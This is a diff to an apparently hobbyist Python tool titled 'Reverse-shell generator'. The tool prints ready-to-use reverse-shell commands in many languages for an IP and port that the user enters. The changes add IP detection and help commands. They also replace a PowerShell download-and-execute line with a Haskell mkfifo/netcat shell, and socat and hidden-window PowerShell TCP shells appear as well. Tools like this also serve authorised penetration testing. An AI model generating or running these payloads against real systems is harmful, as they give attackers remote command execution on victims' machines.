@@ -1,13 +1,21 @@
-import imp
+#!/usr/bin/env python3
 import os
 import platform
-# from colorama import Fore , Back , Style 
+import socket
+from colorama import Fore , Back , Style 
 from turtle import heading
 from pyfiglet import Figlet
-heading = Figlet(font='slant')
+heading = Figlet(font='big')
 print(heading.renderText("Reverse-shell\ngenerator"))
 
-ip = input("\n\nEnter Your ip address\n")
+
+# detecting system ip address
+hostname = socket.gethostname()
+ipaddress = socket.gethostbyname(hostname)
+print("\n\nYour ip address is :"+ipaddress)
+
+
+ip = input(Fore.YELLOW + "\nEnter the ip address\n")
 port = input("Enter the listning port number\n")
 
 def guide():
@@ -30,7 +38,7 @@ def guide():
     print("{:30s} {:30s} {:30s}".format("3   Bash 5" , "13  nc.exe -e " , "23  awk"))
     print("{:30s} {:30s} {:30s}".format("4   Bash udp" , "14  nc -c " , "24  rustcat "))
     print("{:30s} {:30s} {:30s}".format("5   Bash readline" , "15  nc -c " , "25  socat TTY "))
-    print("{:30s} {:30s} {:30s}".format("6   C Windows" , "16  PHP exec" , "26  Windows ConPty"))
+    print("{:30s} {:30s} {:30s}".format("6   C Windows" , "16  PHP exec" , "26  Haskell"))
     print("{:30s} {:30s} {:30s}".format("7   C# TCP client" , "17  PHP shell_exec" , "27  Powershell "))
     print("{:30s} {:30s} {:30s}".format("8   Node js" , "18  PHP system" , "28  Python #2"))
     print("{:30s} {:30s} {:30s}".format("9   PHP Emoji" , "19  PHP popen" , "29  telnet"))
@@ -43,6 +51,7 @@ def guide():
     print("rsg reverse-shell <number of the reverse-shell type>     = to generate the reverse-shell code")
     print("exit                                                     = exit")
     print("clear                                                    = clear the screen\n")
+    print("ifconfig                                                 = to get the ipv4 address of your system")
     print("ls                                                       = list the reverse-shell and listners")
     print("example:-")
     print("{:30s} {:30s}".format("rsg listner 4", "rsg reverse-shell 19\n\n"))
@@ -60,6 +69,12 @@ while True:
             os.system('clear')
     elif take == "ls":
         guide()
+    elif take == "rsg -h":
+        guide()
+    elif take == "ifconfig":
+        print("IPV4 Address :"+ipaddress)
+    elif take == "ipconfig":
+        print("IPV4 Address   :"+ipaddress)
             
     elif take == "rsg listner 1":
         print("\n\nnc -lnvp "+port+"\n\n")
@@ -231,7 +246,11 @@ while True:
     elif take == "rsg reverse-shell 25":
         print("\n\nsocat TCP:"+ip+":"+port+" EXEC:'sh',pty,stderr,setsid,sigint,sane\n\n")
     elif take == "rsg reverse-shell 26":
-        print("\n\nIEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1\n -UseBasicParsing); Invoke-ConPtyShell "+ip+"\t"+port+"\n\n")
+        print("""\n\nmodule Main where
+
+import System.Process
+
+main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2>&1 | nc """+ip+"""\t"""+port+""" >/tmp/f"\n\n""")
     elif take == "rsg reverse-shell 27":
         print("""\n\npowershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object\n
 System.Net.Sockets.TCPClient(" \b"""+ip+""" \b","""+port+""");\n
@@ -279,7 +298,11 @@ try:\n
 except KeyboardInterrupt:\n
     s.close()\n\n""")
         
+    elif take == "show":
+        print("IP-Address            :"+ip)
+        print("Listning port number  :"+port)
         
+    
         
     elif take == "exit":
         break
